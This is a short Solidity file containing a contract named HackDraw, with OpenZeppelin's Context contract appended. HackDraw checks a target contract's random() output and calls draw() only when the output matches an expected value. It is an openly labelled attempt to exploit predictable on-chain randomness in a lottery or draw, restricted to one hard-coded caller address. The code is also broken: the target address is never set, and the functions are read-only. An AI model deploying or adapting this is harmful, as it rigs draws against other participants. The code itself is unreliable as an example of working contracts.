pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/Context.sol';

abstract contract targetContract { 
    function random() public virtual view returns (uint);
    function draw() public virtual view returns (uint);
}

contract HackDraw is Context
{
    targetContract private _target ;

    function tryToGetRandom(uint result) public view returns (uint)
    {
        require(_msgSender() == address(0x58fa166Ef402fB805e5EEc6dE767332d966fA9D3), 'Not callable sender');
        uint r = _target.random();
        if(r == result)
        {
            r = _target.draw();
            return r;
        }
        return 0;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}